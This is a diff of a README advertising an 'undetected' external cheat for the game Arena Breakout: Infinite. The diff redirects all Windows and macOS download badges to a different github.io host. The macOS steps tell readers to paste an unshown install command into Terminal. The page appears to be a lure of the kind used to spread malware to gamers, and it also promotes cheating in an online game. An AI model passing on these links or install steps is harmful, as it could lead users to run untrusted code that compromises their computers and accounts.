@@ -1,9 +1,9 @@
 # 🎮 Arena Breakout: Infinite External — Evidence V2
 
-[![Windows](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge&logo=windows)](https://spearsurvive.github.io/win/)
-[![macOS](https://img.shields.io/badge/Download-macOS-black?style=for-the-badge&logo=apple)](https://spearsurvive.github.io/mac/)
-[![Version](https://img.shields.io/badge/Version-2026-green?style=for-the-badge)](https://spearsurvive.github.io/win/)
-[![Status](https://img.shields.io/badge/Status-Undetected-brightgreen?style=for-the-badge)](https://spearsurvive.github.io/win/)
+[![Windows](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge&logo=windows)](https://zenboulderagora.github.io/Windw/)
+[![macOS](https://img.shields.io/badge/Download-macOS-black?style=for-the-badge&logo=apple)](https://zenboulderagora.github.io/macdw/)
+[![Version](https://img.shields.io/badge/Version-2026-green?style=for-the-badge)](https://zenboulderagora.github.io/Windw/)
+[![Status](https://img.shields.io/badge/Status-Undetected-brightgreen?style=for-the-badge)](https://zenboulderagora.github.io/Windw/)
 
 > The most trusted **Arena Breakout: Infinite External** for 2026 — operates entirely outside the game process with no memory injection, providing a clean and undetected external cheat experience.
 
@@ -45,14 +45,14 @@
 5. 🎮 Launch **Arena Breakout: Infinite** and enter a match
 6. 📋 Press **INSERT** to open the overlay menu
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://spearsurvive.github.io/win/)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
 
 ### macOS
 1. Press ⌘ + Space, open **Terminal**
 2. Paste the install command and press Enter
 3. Follow the on-screen prompts
 
-[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://spearsurvive.github.io/mac/)
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
 
 **Menu Controls**
 
